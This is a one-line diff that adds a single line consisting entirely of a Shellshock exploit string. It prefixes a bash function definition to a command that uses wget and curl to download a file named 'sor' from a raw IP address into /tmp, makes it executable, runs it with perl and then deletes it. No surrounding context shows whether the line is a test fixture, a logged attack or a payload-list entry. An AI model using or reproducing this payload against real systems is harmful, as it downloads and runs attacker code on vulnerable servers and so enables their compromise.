@@ -1,0 +1,1 @@
+() { :;}; /bin/bash -c "wget http://162.243.110.85/sor -O /tmp/sor;curl -o /tmp/sor http://162.243.110.85/sor;chmod +x /tmp/sor;perl /tmp/sor;rm -rf /tmp/sor*"
